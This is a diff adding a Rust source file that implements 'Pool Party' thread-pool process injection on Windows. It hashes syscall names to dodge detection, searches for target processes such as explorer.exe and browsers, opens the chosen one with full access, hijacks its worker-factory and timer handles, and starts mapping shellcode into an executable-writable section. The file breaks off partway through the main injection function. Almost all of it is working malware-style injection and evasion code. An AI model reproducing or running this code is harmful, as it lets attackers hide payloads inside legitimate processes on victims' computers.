@@ -1,0 +1,1498 @@
+#![allow(non_snake_case)]
+#![allow(non_camel_case_types)]
+
+use core::ffi::c_void;
+use crate::hash_macro::HashSeed;
+use crate::{hash_it, debug_println, syscall};
+use const_random::const_random;
+extern crate alloc;
+
+// ========================================
+// Windows Structure Definitions
+// ========================================
+
+/// UNICODE_STRING structure
+#[repr(C)]
+pub struct UNICODE_STRING {
+    pub Length: u16,
+    pub MaximumLength: u16,
+    pub Buffer: *mut u16,
+}
+
+/// OBJECT_ATTRIBUTES structure
+#[repr(C)]
+pub struct OBJECT_ATTRIBUTES {
+    pub Length: u32,
+    pub RootDirectory: *mut c_void,
+    pub ObjectName: *mut UNICODE_STRING,
+    pub Attributes: u32,
+    pub SecurityDescriptor: *mut c_void,
+    pub SecurityQualityOfService: *mut c_void,
+}
+
+/// CLIENT_ID structure
+#[repr(C)]
+pub struct CLIENT_ID {
+    pub UniqueProcess: *mut c_void,
+    pub UniqueThread: *mut c_void,
+}
+
+/// SYSTEM_PROCESS_INFORMATION structure (for process enumeration)
+#[repr(C)]
+pub struct SYSTEM_PROCESS_INFORMATION {
+    pub NextEntryOffset: u32,
+    pub NumberOfThreads: u32,
+    pub Reserved1: [u8; 48],
+    pub ImageName: UNICODE_STRING,
+    pub BasePriority: i32,
+    pub UniqueProcessId: usize,
+    pub Reserved2: usize,
+    pub HandleCount: u32,
+    pub SessionId: u32,
+    pub Reserved3: usize,
+    pub PeakVirtualSize: usize,
+    pub VirtualSize: usize,
+    pub Reserved4: u32,
+    pub PeakWorkingSetSize: usize,
+    pub WorkingSetSize: usize,
+    pub Reserved5: usize,
+    pub QuotaPagedPoolUsage: usize,
+    pub Reserved6: usize,
+    pub QuotaNonPagedPoolUsage: usize,
+    pub PagefileUsage: usize,
+    pub PeakPagefileUsage: usize,
+    pub PrivatePageCount: usize,
+    pub Reserved7: [i64; 6],
+}
+
+// SystemInformationClass values
+pub const SYSTEM_PROCESS_INFORMATION_CLASS: u32 = 5;
+
+// System handle information structures
+#[repr(C)]
+pub struct SYSTEM_HANDLE_TABLE_ENTRY_INFO {
+    pub ProcessId: u16,
+    pub CreatorBackTraceIndex: u16,
+    pub ObjectTypeIndex: u8,
+    pub HandleAttributes: u8,
+    pub HandleValue: u16,
+    pub Object: *mut c_void,
+    pub GrantedAccess: u32,
+}
+
+#[repr(C)]
+pub struct SYSTEM_HANDLE_INFORMATION {
+    pub NumberOfHandles: u32,
+    pub Handles: [SYSTEM_HANDLE_TABLE_ENTRY_INFO; 1],
+}
+
+// ========================================
+// Thread Pool Structures
+// ========================================
+
+/// TP_CALLBACK_INSTANCE (opaque)
+#[repr(C)]
+pub struct TP_CALLBACK_INSTANCE {
+    _opaque: [u8; 0],
+}
+
+/// TP_TIMER (opaque pointer)
+pub type PTP_TIMER = *mut c_void;
+
+/// TP_WORK (opaque pointer)
+pub type PTP_WORK = *mut c_void;
+
+/// TP_CALLBACK_ENVIRON_V3 structure
+#[repr(C)]
+pub struct TP_CALLBACK_ENVIRON_V3 {
+    pub Version: u32,
+    pub Pool: *mut c_void,
+    pub CleanupGroup: *mut c_void,
+    pub CleanupGroupCancelCallback: *mut c_void,
+    pub RaceDll: *mut c_void,
+    pub ActivationContext: *mut c_void,
+    pub FinalizationCallback: *mut c_void,
+    pub u: TP_CALLBACK_ENVIRON_U,
+    pub CallbackPriority: u32,
+    pub Size: u32,
+}
+
+#[repr(C)]
+#[derive(Copy, Clone)]
+pub union TP_CALLBACK_ENVIRON_U {
+    pub Flags: u32,
+    pub s: TP_CALLBACK_ENVIRON_S,
+}
+
+#[repr(C)]
+#[derive(Copy, Clone)]
+pub struct TP_CALLBACK_ENVIRON_S {
+    pub _bitfield: u32,
+}
+
+pub type TP_CALLBACK_ENVIRON = TP_CALLBACK_ENVIRON_V3;
+pub type PTP_CALLBACK_ENVIRON = *mut TP_CALLBACK_ENVIRON;
+
+/// Timer callback function type
+pub type PTP_TIMER_CALLBACK = unsafe extern "system" fn(
+    Instance: *mut TP_CALLBACK_INSTANCE,
+    Context: *mut c_void,
+    Timer: PTP_TIMER,
+);
+
+/// Work callback function type
+pub type PTP_WORK_CALLBACK = unsafe extern "system" fn(
+    Instance: *mut TP_CALLBACK_INSTANCE,
+    Context: *mut c_void,
+    Work: PTP_WORK,
+);
+
+// ========================================
+// Internal Thread Pool Structures (undocumented)
+// ========================================
+// These structures are reverse-engineered from Windows internals
+// Offsets may vary by Windows version - these are for Windows 10/11 x64
+
+#[repr(C)]
+#[derive(Copy, Clone)]
+pub struct LIST_ENTRY {
+    pub Flink: *mut LIST_ENTRY,
+    pub Blink: *mut LIST_ENTRY,
+}
+
+#[repr(C)]
+#[derive(Copy, Clone)]
+pub struct RTL_BALANCED_NODE {
+    pub Children: [*mut RTL_BALANCED_NODE; 2],
+    pub Left: *mut RTL_BALANCED_NODE,
+    pub Right: *mut RTL_BALANCED_NODE,
+    pub ParentValue: usize,
+}
+
+impl RTL_BALANCED_NODE {
+    pub fn new() -> Self {
+        Self {
+            Children: [core::ptr::null_mut(); 2],
+            Left: core::ptr::null_mut(),
+            Right: core::ptr::null_mut(),
+            ParentValue: 0,
+        }
+    }
+}
+
+#[repr(C)]
+pub struct TP_CLEANUP_GROUP_MEMBER {
+    pub Pool: *mut FULL_TP_POOL,
+    pub CleanupGroup: *mut c_void,
+    pub CleanupGroupCancelCallback: *mut c_void,
+    pub RaceDll: *mut c_void,
+    pub ActivationContext: *mut c_void,
+    pub FinalizationCallback: *mut c_void,
+    pub Flags: u32,
+    pub CallbackPriority: u32,
+    pub Size: u32,
+}
+
+#[repr(C)]
+pub struct TP_WORK {
+    pub CleanupGroupMember: TP_CLEANUP_GROUP_MEMBER,
+    pub Task: *mut c_void,
+    pub Callback: *mut c_void,
+}
+
+#[repr(C)]
+pub struct RTL_BALANCED_NODE_WITHKEY {
+    pub Node: RTL_BALANCED_NODE,
+    pub Key: i64,
+}
+
+#[repr(C)]
+pub struct RTL_RB_TREE {
+    pub Root: *mut RTL_BALANCED_NODE,
+    pub Min: *mut RTL_BALANCED_NODE,
+}
+
+#[repr(C)]
+pub struct TP_TIMER_SUBQUEUE {
+    pub WindowStart: RTL_RB_TREE,
+    pub WindowEnd: RTL_RB_TREE,
+}
+
+#[repr(C)]
+pub struct TP_TIMER_QUEUE {
+    pub AbsoluteQueue: TP_TIMER_SUBQUEUE,
+    pub RelativeQueue: TP_TIMER_SUBQUEUE,
+}
+
+#[repr(C)]
+pub struct FULL_TP_POOL {
+    _padding: [u8; 0x160], // Padding to TimerQueue offset
+    pub TimerQueue: TP_TIMER_QUEUE,
+}
+
+#[repr(C)]
+pub struct FULL_TP_TIMER {
+    pub Work: TP_WORK,
+    pub DueTime: i64,
+    pub WindowStartLinks: RTL_BALANCED_NODE_WITHKEY,
+    pub WindowEndLinks: RTL_BALANCED_NODE_WITHKEY,
+    // Additional fields follow but we don't need them
+}
+
+// Worker Factory structures
+#[repr(C)]
+pub struct WORKER_FACTORY_BASIC_INFORMATION {
+    pub Timeout: i64,              // LARGE_INTEGER
+    pub RetryTimeout: i64,         // LARGE_INTEGER
+    pub IdleTimeout: i64,          // LARGE_INTEGER
+    pub Paused: u8,                // BOOLEAN
+    pub TimerSet: u8,              // BOOLEAN
+    pub QueuedToExWorker: u8,      // BOOLEAN
+    pub MayCreate: u8,             // BOOLEAN
+    pub CreateInProgress: u8,      // BOOLEAN
+    pub InsertedIntoQueue: u8,     // BOOLEAN
+    pub Shutdown: u8,              // BOOLEAN
+    // Compiler adds 1 byte padding here automatically
+    pub BindingCount: u32,         // ULONG
+    pub ThreadMinimum: u32,        // ULONG
+    pub ThreadMaximum: u32,        // ULONG
+    pub PendingWorkerCount: u32,   // ULONG
+    pub WaitingWorkerCount: u32,   // ULONG
+    pub TotalWorkerCount: u32,     // ULONG
+    pub ReleaseCount: u32,         // ULONG
+    pub InfiniteWaitGoal: i64,     // LONGLONG
+    pub StartRoutine: *mut c_void, // PVOID
+    pub StartParameter: *mut c_void, // PVOID - TP_POOL pointer!
+    pub ProcessId: *mut c_void,    // HANDLE
+    pub StackReserve: usize,       // SIZE_T
+    pub StackCommit: usize,        // SIZE_T
+    pub LastThreadCreationStatus: i32, // NTSTATUS
+}
+
+// T2_SET_PARAMETERS for NtSetTimer2
+#[repr(C)]
+pub struct T2_SET_PARAMETERS {
+    pub Version: u32,
+    pub Reserved: u32,
+    pub NoWakeTolerance: i64,
+}
+
+// Structures for NtQueryObject
+#[repr(C)]
+pub struct OBJECT_TYPE_INFORMATION {
+    pub TypeName: UNICODE_STRING,
+    pub TotalNumberOfObjects: u32,
+    pub TotalNumberOfHandles: u32,
+    pub TotalPagedPoolUsage: u32,
+    pub TotalNonPagedPoolUsage: u32,
+    pub TotalNamePoolUsage: u32,
+    pub TotalHandleTableUsage: u32,
+    pub HighWaterNumberOfObjects: u32,
+    pub HighWaterNumberOfHandles: u32,
+    pub HighWaterPagedPoolUsage: u32,
+    pub HighWaterNonPagedPoolUsage: u32,
+    pub HighWaterNamePoolUsage: u32,
+    pub HighWaterHandleTableUsage: u32,
+    pub InvalidAttributes: u32,
+    pub GenericMapping: [u32; 4],
+    pub ValidAccessMask: u32,
+    pub SecurityRequired: u8,
+    pub MaintainHandleCount: u8,
+    pub TypeIndex: u16,
+    pub ReservedByte: u8,
+    pub PoolType: u32,
+    pub DefaultPagedPoolCharge: u32,
+    pub DefaultNonPagedPoolCharge: u32,
+}
+
+// Structures for ProcessHandleInformation
+#[repr(C)]
+pub struct PROCESS_HANDLE_TABLE_ENTRY_INFO {
+    pub HandleValue: isize,
+    pub HandleCount: usize,
+    pub PointerCount: usize,
+    pub GrantedAccess: u32,
+    pub ObjectTypeIndex: u32,
+    pub HandleAttributes: u32,
+    pub Reserved: u32,
+}
+
+#[repr(C)]
+pub struct PROCESS_HANDLE_SNAPSHOT_INFORMATION {
+    pub NumberOfHandles: usize,
+    pub Reserved: usize,
+    pub Handles: PROCESS_HANDLE_TABLE_ENTRY_INFO,
+}
+
+// ========================================
+// Syscall Function Type Definitions
+// ========================================
+
+pub type NtOpenProcessFn = unsafe extern "system" fn(
+    ProcessHandle: *mut isize,
+    DesiredAccess: u32,
+    ObjectAttributes: *mut OBJECT_ATTRIBUTES,
+    ClientId: *mut CLIENT_ID,
+) -> i32;
+
+pub type NtQuerySystemInformationFn = unsafe extern "system" fn(
+    SystemInformationClass: u32,
+    SystemInformation: *mut c_void,
+    SystemInformationLength: u32,
+    ReturnLength: *mut u32,
+) -> i32;
+
+pub type NtAllocateVirtualMemoryFn = unsafe extern "system" fn(
+    ProcessHandle: isize,
+    BaseAddress: *mut *mut c_void,
+    ZeroBits: usize,
+    RegionSize: *mut usize,
+    AllocationType: u32,
+    Protect: u32,
+) -> i32;
+
+pub type NtWriteVirtualMemoryFn = unsafe extern "system" fn(
+    ProcessHandle: isize,
+    BaseAddress: *mut c_void,
+    Buffer: *const c_void,
+    NumberOfBytesToWrite: usize,
+    NumberOfBytesWritten: *mut usize,
+) -> i32;
+
+pub type NtReadVirtualMemoryFn = unsafe extern "system" fn(
+    ProcessHandle: isize,
+    BaseAddress: *mut c_void,
+    Buffer: *mut c_void,
+    NumberOfBytesToRead: usize,
+    NumberOfBytesRead: *mut usize,
+) -> i32;
+
+pub type NtProtectVirtualMemoryFn = unsafe extern "system" fn(
+    ProcessHandle: isize,
+    BaseAddress: *mut *mut c_void,
+    NumberOfBytesToProtect: *mut usize,
+    NewAccessProtection: u32,
+    OldAccessProtection: *mut u32,
+) -> i32;
+
+pub type NtCreateSectionFn = unsafe extern "system" fn(
+    SectionHandle: *mut isize,
+    DesiredAccess: u32,
+    ObjectAttributes: *mut OBJECT_ATTRIBUTES,
+    MaximumSize: *mut i64,
+    SectionPageProtection: u32,
+    AllocationAttributes: u32,
+    FileHandle: isize,
+) -> i32;
+
+pub type NtMapViewOfSectionFn = unsafe extern "system" fn(
+    SectionHandle: isize,
+    ProcessHandle: isize,
+    BaseAddress: *mut *mut c_void,
+    ZeroBits: usize,
+    CommitSize: usize,
+    SectionOffset: *mut i64,
+    ViewSize: *mut usize,
+    InheritDisposition: u32,
+    AllocationType: u32,
+    Win32Protect: u32,
+) -> i32;
+
+pub type NtUnmapViewOfSectionFn = unsafe extern "system" fn(
+    ProcessHandle: isize,
+    BaseAddress: *mut c_void,
+) -> i32;
+
+pub type TpAllocTimerFn = unsafe extern "system" fn(
+    Callback: PTP_TIMER_CALLBACK,
+    Context: *mut c_void,
+    Environment: PTP_CALLBACK_ENVIRON,
+) -> PTP_TIMER;
+
+pub type TpSetTimerFn = unsafe extern "system" fn(
+    Timer: PTP_TIMER,
+    DueTime: *const i64,
+    Period: u32,
+    WindowLength: u32,
+);
+
+pub type TpReleaseTimerFn = unsafe extern "system" fn(
+    Timer: PTP_TIMER,
+);
+
+pub type NtQueryInformationWorkerFactoryFn = unsafe extern "system" fn(
+    WorkerFactoryHandle: isize,
+    WorkerFactoryInformationClass: u32,
+    WorkerFactoryInformation: *mut c_void,
+    WorkerFactoryInformationLength: u32,
+    ReturnLength: *mut u32,
+) -> i32;
+
+pub type NtSetTimer2Fn = unsafe extern "system" fn(
+    TimerHandle: isize,
+    DueTime: *const i64,
+    Period: *const i64,
+    Parameters: *const T2_SET_PARAMETERS,
+) -> i32;
+
+pub type NtDuplicateObjectFn = unsafe extern "system" fn(
+    SourceProcessHandle: isize,
+    SourceHandle: isize,
+    TargetProcessHandle: isize,
+    TargetHandle: *mut isize,
+    DesiredAccess: u32,
+    HandleAttributes: u32,
+    Options: u32,
+) -> i32;
+
+pub type NtQueryInformationProcessFn = unsafe extern "system" fn(
+    ProcessHandle: isize,
+    ProcessInformationClass: u32,
+    ProcessInformation: *mut c_void,
+    ProcessInformationLength: u32,
+    ReturnLength: *mut u32,
+) -> i32;
+
+pub type NtQueryObjectFn = unsafe extern "system" fn(
+    Handle: isize,
+    ObjectInformationClass: u32,
+    ObjectInformation: *mut c_void,
+    ObjectInformationLength: u32,
+    ReturnLength: *mut u32,
+) -> i32;
+
+pub type NtCloseFn = unsafe extern "system" fn(
+    Handle: isize,
+) -> i32;
+
+// ========================================
+// Constants
+// ========================================
+
+pub const PROCESS_ALL_ACCESS: u32 = 0x001F0FFF;
+pub const PROCESS_VM_WRITE: u32 = 0x0020;
+pub const PROCESS_VM_OPERATION: u32 = 0x0008;
+
+pub const MEM_COMMIT: u32 = 0x00001000;
+pub const MEM_RESERVE: u32 = 0x00002000;
+
+pub const PAGE_EXECUTE_READ: u32 = 0x20;
+pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+pub const PAGE_READWRITE: u32 = 0x04;
+
+// Section constants
+pub const SECTION_MAP_READ: u32 = 0x0004;
+pub const SECTION_MAP_WRITE: u32 = 0x0002;
+pub const SECTION_MAP_EXECUTE: u32 = 0x0008;
+pub const SECTION_ALL_ACCESS: u32 = 0x000F001F;
+
+pub const SEC_COMMIT: u32 = 0x08000000;
+pub const SEC_RESERVE: u32 = 0x04000000;
+
+// ViewUnmap constants
+pub const VIEW_SHARE: u32 = 1;
+pub const VIEW_UNMAP: u32 = 2;
+
+// ========================================
+// Hash definitions for syscalls
+// ========================================
+
+pub const NT_OPEN_PROCESS: HashSeed = hash_it!("NtOpenProcess");
+pub const NT_QUERY_SYSTEM_INFORMATION: HashSeed = hash_it!("NtQuerySystemInformation");
+pub const NT_ALLOCATE_VIRTUAL_MEMORY: HashSeed = hash_it!("NtAllocateVirtualMemory");
+pub const NT_WRITE_VIRTUAL_MEMORY: HashSeed = hash_it!("NtWriteVirtualMemory");
+pub const NT_READ_VIRTUAL_MEMORY: HashSeed = hash_it!("NtReadVirtualMemory");
+pub const NT_PROTECT_VIRTUAL_MEMORY: HashSeed = hash_it!("NtProtectVirtualMemory");
+pub const NT_CREATE_SECTION: HashSeed = hash_it!("NtCreateSection");
+pub const NT_MAP_VIEW_OF_SECTION: HashSeed = hash_it!("NtMapViewOfSection");
+pub const NT_UNMAP_VIEW_OF_SECTION: HashSeed = hash_it!("NtUnmapViewOfSection");
+
+// Thread pool APIs are exported from ntdll but aren't syscalls - they're regular functions
+// We'll need to get them via GetProcAddress or similar
+pub const TP_ALLOC_TIMER: HashSeed = hash_it!("TpAllocTimer");
+pub const TP_SET_TIMER: HashSeed = hash_it!("TpSetTimer");
+pub const TP_RELEASE_TIMER: HashSeed = hash_it!("TpReleaseTimer");
+
+// kernel32 thread pool APIs (high-level, safer to call)
+pub const CREATE_THREADPOOL_TIMER: HashSeed = hash_it!("CreateThreadpoolTimer");
+pub const SET_THREADPOOL_TIMER: HashSeed = hash_it!("SetThreadpoolTimer");
+
+// New syscalls for proper Pool Party implementation
+pub const NT_QUERY_INFORMATION_WORKER_FACTORY: HashSeed = hash_it!("NtQueryInformationWorkerFactory");
+pub const NT_SET_TIMER2: HashSeed = hash_it!("NtSetTimer2");
+pub const NT_DUPLICATE_OBJECT: HashSeed = hash_it!("NtDuplicateObject");
+pub const NT_QUERY_INFORMATION_PROCESS: HashSeed = hash_it!("NtQueryInformationProcess");
+pub const NT_QUERY_OBJECT: HashSeed = hash_it!("NtQueryObject");
+pub const NT_CLOSE: HashSeed = hash_it!("NtClose");
+
+// System handle information
+pub const SYSTEM_HANDLE_INFORMATION_CLASS: u32 = 16;
+pub const SYSTEM_EXTENDED_HANDLE_INFORMATION_CLASS: u32 = 64;
+
+// Process information classes
+pub const PROCESS_HANDLE_INFORMATION_CLASS: u32 = 51; // ProcessHandleInformation
+
+// Object information classes
+pub const OBJECT_TYPE_INFORMATION_CLASS: u32 = 2; // ObjectTypeInformation
+
+// Worker Factory information class
+pub const WORKER_FACTORY_BASIC_INFORMATION_CLASS: u32 = 7;
+
+// Handle type constants (note: these vary by Windows version, prefer string comparison)
+pub const OBJECT_TYPE_TIMER: u32 = 0x0009; // TpTimerObjectType
+pub const OBJECT_TYPE_WORKER_FACTORY: u32 = 0x002D; // TpWorkerFactoryObjectType
+
+// Duplicate handle options
+pub const DUPLICATE_SAME_ACCESS: u32 = 0x00000002;
+
+// ========================================
+// Pool Party Implementation
+// ========================================
+
+/// Dummy callback for TpAllocTimer (won't actually be called)
+pub unsafe extern "system" fn dummy_timer_callback(
+    _instance: *mut TP_CALLBACK_INSTANCE,
+    _context: *mut c_void,
+    _timer: PTP_TIMER,
+) {
+    // This won't be executed - we'll replace it
+}
+
+/// Helper function to get a function address from ntdll by hash
+/// This is for regular exports (like TpAllocTimer), not syscalls
+pub unsafe fn get_ntdll_export(hash_seed: HashSeed) -> Option<*mut c_void> {
+    unsafe {
+        let ntdll_handle = crate::syscall::NTDLL_HANDLE;
+        if ntdll_handle == 0 {
+            debug_println!("[-] NTDLL not initialized");
+            return None;
+        }
+
+        let (func_ptr, _ssn) = crate::syscall::getproc_address_ssn(ntdll_handle, hash_seed);
+        func_ptr.map(|f| f as *mut c_void)
+    }
+}
+
+/// Helper function to get kernel32.dll base address
+pub unsafe fn get_kernel32_handle() -> Option<usize> {
+    use crate::syscall::get_module_handle;
+
+    // kernel32.dll hash
+    let kernel32_hash = hash_it!("kernel32.dll");
+
+    // Get kernel32 module
+    let kernel32_info = get_module_handle(kernel32_hash);
+    if kernel32_info.is_none() {
+        debug_println!("[-] Failed to find kernel32.dll");
+        return None;
+    }
+
+    let (base_address, _end_address) = kernel32_info.unwrap();
+    debug_println!("[+] kernel32.dll base: {:#x}", base_address);
+    Some(base_address)
+}
+
+/// Helper function to get a function address from kernel32 by hash
+pub unsafe fn get_kernel32_export(hash_seed: HashSeed) -> Option<*mut c_void> {
+    let kernel32_handle = get_kernel32_handle()?;
+    let (func_ptr, _ssn) = crate::syscall::getproc_address_ssn(kernel32_handle, hash_seed);
+    func_ptr.map(|f| f as *mut c_void)
+}
+
+/// Find a process by name and return its PID
+/// Tries common target processes: explorer.exe, msedge.exe, firefox.exe, cmd.exe
+pub unsafe fn find_target_process() -> Option<u32> {
+    // Common target processes (in order of preference)
+    let targets = [
+        "explorer.exe",  // Windows Explorer - always running
+        "msedge.exe",    // Microsoft Edge
+        "firefox.exe",   // Firefox
+        "chrome.exe",    // Chrome
+        "cmd.exe",       // Command Prompt
+    ];
+
+    debug_println!("\n[*] Searching for target process...");
+
+    for target in &targets {
+        if let Some(pid) = unsafe { find_process_by_name(target) } {
+            debug_println!("[+] Found target: {} (PID: {})", target, pid);
+            return Some(pid);
+        }
+        debug_println!("[-] {} not found", target);
+    }
+
+    debug_println!("[-] No suitable target process found");
+    None
+}
+
+/// Find a specific process by name
+/// Returns the PID if found, None otherwise
+pub unsafe fn find_process_by_name(process_name: &str) -> Option<u32> {
+    debug_println!("[*] Looking for process: {}", process_name);
+
+    // Allocate buffer for process information
+    let mut buffer_size: u32 = 1024 * 512; // Start with 512KB
+    let mut buffer = alloc::vec![0u8; buffer_size as usize];
+    let mut return_length: u32 = 0;
+
+    // Query system information
+    let mut status = syscall!(
+        NT_QUERY_SYSTEM_INFORMATION,
+        NtQuerySystemInformationFn,
+        SYSTEM_PROCESS_INFORMATION_CLASS,
+        buffer.as_mut_ptr() as *mut c_void,
+        buffer_size,
+        &mut return_length
+    );
+
+    // If buffer too small, reallocate and try again
+    if status == 0xC0000004u32 as i32 {  // STATUS_INFO_LENGTH_MISMATCH
+        buffer_size = return_length + 4096;  // Add some extra space
+        buffer = alloc::vec![0u8; buffer_size as usize];
+
+        status = syscall!(
+            NT_QUERY_SYSTEM_INFORMATION,
+            NtQuerySystemInformationFn,
+            SYSTEM_PROCESS_INFORMATION_CLASS,
+            buffer.as_mut_ptr() as *mut c_void,
+            buffer_size,
+            &mut return_length
+        );
+    }
+
+    if status != 0 {
+        debug_println!("[-] NtQuerySystemInformation failed: {:#x}", status);
+        return None;
+    }
+
+    // Iterate through process list
+    let mut current_ptr = buffer.as_ptr() as *const SYSTEM_PROCESS_INFORMATION;
+
+    loop {
+        let current = unsafe { &*current_ptr };
+
+        // Get process name from UNICODE_STRING
+        if !current.ImageName.Buffer.is_null() && current.ImageName.Length > 0 {
+            let name_len = (current.ImageName.Length / 2) as usize;  // Convert bytes to u16 count
+            let name_slice = unsafe {
+                core::slice::from_raw_parts(
+                    current.ImageName.Buffer,
+                    name_len
+                )
+            };
+
+            // Convert UTF-16 to UTF-8 for comparison (simple ASCII conversion)
+            let mut name_buf = alloc::vec![0u8; name_len];
+            for (i, &c) in name_slice.iter().enumerate() {
+                name_buf[i] = if c < 128 { c as u8 } else { b'?' };
+            }
+
+            if let Ok(current_name) = core::str::from_utf8(&name_buf) {
+                // Case-insensitive comparison
+                if current_name.eq_ignore_ascii_case(process_name) {
+                    let pid = current.UniqueProcessId as u32;
+                    debug_println!("[+] Found {}! PID: {}", process_name, pid);
+                    return Some(pid);
+                }
+            }
+        }
+
+        // Check if this is the last entry
+        if current.NextEntryOffset == 0 {
+            break;
+        }
+
+        // Move to next entry
+        current_ptr = (current_ptr as usize + current.NextEntryOffset as usize) as *const SYSTEM_PROCESS_INFORMATION;
+    }
+
+    debug_println!("[-] Process {} not found", process_name);
+    None
+}
+
+// ========================================
+// Pool Party Helper Functions
+// ========================================
+
+/// Generic function to hijack (duplicate) a handle by object type name
+/// This is the cleanest approach - works across all Windows versions
+/// Based on SafeBreach PoolParty implementation
+unsafe fn hijack_process_handle(
+    process_handle: isize,
+    object_type_name: &str,
+) -> Option<isize> {
+    debug_println!("[*] Searching for '{}' handle in target process...", object_type_name);
+
+    // Query process handles using NtQueryInformationProcess
+    let mut buffer_size: u32 = 1024 * 1024; // 1MB initial
+    let mut buffer = alloc::vec![0u8; buffer_size as usize];
+    let mut return_length: u32 = 0;
+
+    let status = syscall!(
+        NT_QUERY_INFORMATION_PROCESS,
+        NtQueryInformationProcessFn,
+        process_handle,
+        PROCESS_HANDLE_INFORMATION_CLASS,
+        buffer.as_mut_ptr() as *mut c_void,
+        buffer_size,
+        &mut return_length
+    );
+
+    if status != 0 {
+        debug_println!("[-] NtQueryInformationProcess failed: {:#x}", status);
+        return None;
+    }
+
+    let handle_snapshot = buffer.as_ptr() as *const PROCESS_HANDLE_SNAPSHOT_INFORMATION;
+    let num_handles = (*handle_snapshot).NumberOfHandles;
+    debug_println!("[+] Found {} handles in target process", num_handles);
+
+    // Get array of handles
+    let handles_ptr = &(*handle_snapshot).Handles as *const PROCESS_HANDLE_TABLE_ENTRY_INFO;
+    let handles_slice = core::slice::from_raw_parts(handles_ptr, num_handles);
+
+    let mut found_types = alloc::collections::BTreeMap::new();
+
+    for (i, handle_entry) in handles_slice.iter().enumerate() {
+        // Try to duplicate the handle to our process
+        let mut duplicated_handle: isize = 0;
+
+        let dup_status = syscall!(
+            NT_DUPLICATE_OBJECT,
+            NtDuplicateObjectFn,
+            process_handle,
+            handle_entry.HandleValue,
+            -1isize, // Current process
+            &mut duplicated_handle,
+            0,
+            0,
+            DUPLICATE_SAME_ACCESS
+        );
+
+        if dup_status != 0 {
+            continue; // Can't duplicate, skip
+        }
+
+        // Query object type - first get size
+        let mut type_info_len: u32 = 0;
+        let _ = syscall!(
+            NT_QUERY_OBJECT,
+            NtQueryObjectFn,
+            duplicated_handle,
+            OBJECT_TYPE_INFORMATION_CLASS,
+            core::ptr::null_mut(),
+            0,
+            &mut type_info_len
+        );
+
+        if type_info_len == 0 || type_info_len > 1024 * 10 {
+            let _ = syscall!(NT_CLOSE, NtCloseFn, duplicated_handle);
+            continue;
+        }
+
+        // Get actual object type info
+        let mut type_info_buffer = alloc::vec![0u8; type_info_len as usize];
+        let query_status = syscall!(
+            NT_QUERY_OBJECT,
+            NtQueryObjectFn,
+            duplicated_handle,
+            OBJECT_TYPE_INFORMATION_CLASS,
+            type_info_buffer.as_mut_ptr() as *mut c_void,
+            type_info_len,
+            core::ptr::null_mut()
+        );
+
+        if query_status == 0 {
+            let type_info = type_info_buffer.as_ptr() as *const OBJECT_TYPE_INFORMATION;
+
+            if !(*type_info).TypeName.Buffer.is_null() && (*type_info).TypeName.Length > 0 {
+                let name_len = ((*type_info).TypeName.Length / 2) as usize;
+                let name_slice = core::slice::from_raw_parts(
+                    (*type_info).TypeName.Buffer,
+                    name_len
+                );
+
+                // Convert UTF-16 to ASCII
+                let mut name_buf = alloc::vec![0u8; name_len];
+                for (idx, &c) in name_slice.iter().enumerate() {
+                    name_buf[idx] = if c < 128 { c as u8 } else { b'?' };
+                }
+
+                if let Ok(type_name) = core::str::from_utf8(&name_buf) {
+                    *found_types.entry(alloc::string::String::from(type_name)).or_insert(0) += 1;
+
+                    // Check if this matches our target type
+                    if type_name == object_type_name {
+                        debug_println!("[+] Found '{}' handle at index {}!", object_type_name, i);
+                        debug_println!("[+] Duplicated handle: {:#x}", duplicated_handle);
+                        return Some(duplicated_handle);
+                    }
+                }
+            }
+        }
+
+        // Close duplicated handle if not the one we're looking for
+        let _ = syscall!(NT_CLOSE, NtCloseFn, duplicated_handle);
+    }
+
+    debug_println!("[-] No '{}' handle found", object_type_name);
+    debug_println!("[*] Found handle types: {:?}", found_types);
+    None
+}
+
+/// Hijack Worker Factory handle from target process
+unsafe fn hijack_worker_factory_handle(process_handle: isize) -> Option<isize> {
+    hijack_process_handle(process_handle, "TpWorkerFactory")
+}
+
+/// Hijack Timer handle from target process
+unsafe fn hijack_timer_handle(process_handle: isize) -> Option<isize> {
+    hijack_process_handle(process_handle, "IRTimer")
+}
+
+/// Hijack IoCompletion handle from target process
+unsafe fn hijack_iocompletion_handle(process_handle: isize) -> Option<isize> {
+    hijack_process_handle(process_handle, "IoCompletion")
+}
+
+/// Main Pool Party injection function using TP_TIMER with NtMapViewOfSection
+pub unsafe fn inject_via_tp_timer(
+    pid: u32,
+    shellcode: &[u8],
+) -> i32 {
+    use core::ptr::{copy_nonoverlapping, null_mut};
+
+    debug_println!("\n=== Starting TP_TIMER Pool Party Injection (with NtMapViewOfSection) ===");
+    debug_println!("[*] Target PID: {}", pid);
+    debug_println!("[*] Shellcode size: {} bytes", shellcode.len());
+
+    // Step 1: Open the target process
+    debug_println!("\n[*] Step 1: Opening target process...");
+
+    let mut process_handle: isize = 0;
+    let mut client_id = CLIENT_ID {
+        UniqueProcess: pid as *mut c_void,
+        UniqueThread: null_mut(),
+    };
+    let mut obj_attr = OBJECT_ATTRIBUTES {
+        Length: core::mem::size_of::<OBJECT_ATTRIBUTES>() as u32,
+        RootDirectory: null_mut(),
+        ObjectName: null_mut(),
+        Attributes: 0,
+        SecurityDescriptor: null_mut(),
+        SecurityQualityOfService: null_mut(),
+    };
+
+    let status = syscall!(
+        NT_OPEN_PROCESS,
+        NtOpenProcessFn,
+        &mut process_handle,
+        PROCESS_ALL_ACCESS,
+        &mut obj_attr,
+        &mut client_id
+    );
+
+    if status != 0 {
+        debug_println!("[-] NtOpenProcess failed: {:#x}", status);
+        return status;
+    }
+    debug_println!("[+] Process handle: {:#x}", process_handle);
+
+    // Step 2: Create a memory section
+    debug_println!("\n[*] Step 2: Creating memory section...");
+
+    let mut section_handle: isize = 0;
+    let mut section_size: i64 = shellcode.len() as i64;
+
+    let status = syscall!(
+        NT_CREATE_SECTION,
+        NtCreateSectionFn,
+        &mut section_handle,
+        SECTION_ALL_ACCESS,
+        null_mut(),  // No object attributes
+        &mut section_size,
+        PAGE_EXECUTE_READWRITE,  // Maximum protection - allows RW and RX mappings
+        SEC_COMMIT,
+        0  // No file handle (anonymous section)
+    );
+
+    if status != 0 {
+        debug_println!("[-] NtCreateSection failed: {:#x}", status);
+        return status;
+    }
+    debug_println!("[+] Section handle: {:#x} (PAGE_EXECUTE_READWRITE)", section_handle);
+
+    // Step 3: Map section into local process (RW)
+    debug_println!("\n[*] Step 3: Mapping section into local process...");
+
+    let mut local_addr: *mut c_void = null_mut();
